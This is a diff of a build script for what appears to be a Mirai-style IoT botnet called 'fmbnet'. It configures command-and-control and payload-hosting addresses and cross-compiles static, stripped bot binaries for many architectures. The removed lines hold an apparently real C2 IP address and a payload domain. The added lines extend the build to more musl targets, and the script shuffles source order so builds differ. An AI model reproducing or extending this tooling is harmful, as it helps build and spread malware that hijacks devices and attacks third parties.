@@ -5,9 +5,9 @@ SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
 cd "$PROJECT_DIR"
 
-SERVER_IP="${SERVER_IP:-195.209.219.35}"
+SERVER_IP="${SERVER_IP:-127.0.0.1}"
 CNC_IP="${CNC_IP:-$SERVER_IP}"
-BINS_DOMAIN="${BINS_DOMAIN:-suck.tcpmalware.live}"
+BINS_DOMAIN="${BINS_DOMAIN:-localhost}"
 PROTO_KEY="${PROTO_KEY:-}"
 if [ -f build.conf ]; then
 	. build.conf
@@ -65,23 +65,27 @@ compile_x86() {
 	echo "[*] compiling fmbnet.x86"
 	local files
 	files=($(ls bot/*.c | shuf 2>/dev/null || ls bot/*.c))
-	gcc -std=c99 -static -DNP_TELNET $PROTO_DEF -ffunction-sections -fdata-sections \
+	gcc -std=gnu99 -static -DNP_TELNET $PROTO_DEF -ffunction-sections -fdata-sections \
 		-w -Os ${files[@]} -o "$RELEASE/fmbnet.x86" -lpthread -ldl -Wl,--gc-sections
 	strip -s -x "$RELEASE/fmbnet.x86" 2>/dev/null || strip "$RELEASE/fmbnet.x86" -S --strip-unneeded 2>/dev/null || true
 }
 
 compile_multi() {
-	local specs=(
-		"i686-linux-gnu:fmbnet.x86:x86:X32"
-		"arm-linux-gnueabi:fmbnet.arm:arm:ARM"
-		"arm-linux-gnueabihf:fmbnet.arm7:arm7:ARM"
-		"aarch64-linux-gnu:fmbnet.aarch64:aarch64:AARCH64"
-		"powerpc-linux-gnu:fmbnet.ppc:ppc:PPC"
-		"powerpc64le-linux-gnu:fmbnet.ppc64le:ppc64le:PPC64LE"
-		"riscv64-linux-gnu:fmbnet.riscv64:riscv64:RISCV64"
-		"mips-linux-gnu:fmbnet.mips:mips:MIPS"
-		"mipsel-linux-gnu:fmbnet.mpsl:mpsl:MIPSEL"
-	)
+local specs=(
+    "x86_64-linux-musl:fmbnet.x86:x86:X86"
+    "i686-linux-musl:fmbnet.x86:x86:X86"
+    "arm-linux-musleabi:fmbnet.arm:arm:ARM"
+    "arm-linux-musleabihf:fmbnet.arm7:arm7:ARM7"
+    "aarch64-linux-musl:fmbnet.aarch64:aarch64:AARCH64"
+    "powerpc-linux-musl:fmbnet.ppc:ppc:PPC"
+    "powerpc64le-linux-musl:fmbnet.ppc64le:ppc64le:PPC64LE"
+    "riscv64-linux-musl:fmbnet.riscv64:riscv64:RISCV64"
+    "mips-linux-musl:fmbnet.mips:mips:MIPS"
+    "mipsel-linux-musl:fmbnet.mpsl:mpsl:MPSL"
+    "m68k-linux-musl:fmbnet.m68k:m68k:M68K"
+    "sh4-linux-musl:fmbnet.sh4:sh4:SH4"
+    "sparc-linux-musl:fmbnet.sparc:sparc:SPARC"
+)
 	for spec in "${specs[@]}"; do
 		prefix="${spec%%:*}"
 		rest="${spec#*:}"
@@ -93,7 +97,7 @@ compile_multi() {
 			echo "[*] compiling $out"
 			local files
 			files=($(ls bot/*.c | shuf 2>/dev/null || ls bot/*.c))
-			${prefix}-gcc -std=c99 -static -DNP_TELNET $PROTO_DEF -ffunction-sections -fdata-sections \
+			${prefix}-gcc -std=gnu99 -static -DNP_TELNET $PROTO_DEF -ffunction-sections -fdata-sections \
 				-w -Os ${files[@]} -o "$RELEASE/$out" -Dfmbnet_BOT_ARCH=\"$arch\" -lpthread -ldl -Wl,--gc-sections
 			if [ ! -f "$RELEASE/$out" ]; then
 				echo "[!] $out NOT created — compilation failed!"
